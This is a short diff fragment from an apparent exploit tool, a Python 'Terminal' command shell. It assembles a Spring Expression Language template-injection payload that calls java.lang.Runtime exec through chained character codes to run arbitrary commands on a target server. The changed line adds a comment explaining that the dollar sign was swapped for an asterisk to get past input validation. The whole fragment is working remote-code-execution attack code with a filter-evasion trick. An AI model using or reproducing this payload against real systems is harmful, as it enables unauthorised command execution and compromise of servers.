@@ -37,7 +37,7 @@ class Terminal(Cmd):
 			decimals.append(str(ord(i)))
 
 		payload='''*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)''' % decimals[0]
-		
+		#replaced dollar sign with * for input validation workaround
 
 		for i in decimals[1:]:
 			line='.concat(T(java.lang.Character).toString({}))'.format(i)
